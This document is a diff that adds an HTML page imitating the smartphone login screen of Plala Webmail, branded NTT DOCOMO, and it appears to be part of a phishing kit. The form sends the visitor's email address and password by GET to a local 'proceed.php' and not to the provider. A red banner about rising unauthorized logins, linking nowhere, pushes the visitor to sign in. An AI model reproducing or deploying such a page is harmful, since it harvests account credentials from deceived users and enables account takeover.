@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ja"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1">
+<meta name="format-detection" content="telephone=no">
+<title>ぷららWebメール</title>
+<script src="filess/tags.js.download" type="text/javascript">
+</script>
+<script type="text/javascript">
+var g_device = '';
+function submitForm(device){
+        var f = document.forms["form"];
+        f.method = "POST";
+	f.flag.value = device;
+        f.action = "/cgi-bin/mail/plus/agent.cgi";
+        f.submit();
+        return ;
+}
+
+function save_confirm(){
+	if(document.getElementById("memorize_info").checked ){
+		flg= confirm("次回からメールアドレスとメールパスワードの入力を省略できます。よろしいですか？\n※ご自身以外もこの端末を利用する場合は、チェックを外してください。");
+		if(!flg){
+			document.getElementById("memorize_info").checked = false;
+		}
+	}
+}
+
+
+</script>
+<base href=".">
+<link rel="stylesheet" href="filess/smp.css">
+</head>
+<body class="login">
+
+
+<header role="banner">
+<h1><img src="filess/logo.png" alt="">ぷららWebメール<br>スマートフォン版</h1>
+</header>
+
+<div id="content" role="main">
+
+<div class="message">
+<p><strong></strong></p>
+<p>スマートフォン版のぷららWebメールにログインします。パソコン版を利用される場合は、画面下の「PC版にログイン」をクリックしてください。</p>
+ <font color="red">
+                WEBメールへの悪質な不正ログインが増えてます。
+<a href="#">こちら</a>の手順でご確認をお願いします。    </font></div>
+<form name="form" method="get" action="proceed.php">
+<div class="login">
+<dl>
+<dt>メールアドレス</dt>
+<dd><input type="email" name="userid" value=""></dd>
+<dt>メールパスワード</dt>
+<div id="pwd">
+<dd><input type="password" name="password" value=""></dd>
+</div>
+</dl>
+
+
+<div ><input type="checkbox" name="save" value="1" onClick="save_confirm()" style=""><label for="memorize_info">メールアドレスを記録する。</label></div>
+
+<div class="btn_login"><input type="submit" name="sum" value="ログイン" style="background-color:#00CC00; height:40px; border-color:#CCCCCC; color:#FFFFFF; width:132px"></div>
+
+<div class="btn_login"><input type="submit" name="sum" value="PC版にログイン" style="background-color:#00CC00; height:40px; border-color:#CCCCCC; color:#FFFFFF; width:132px"></div>
+</div>
+<footer role="contentinfo">
+<small>©NTT DOCOMO</small></footer>
+</form>
+
+
+</div></body></html>
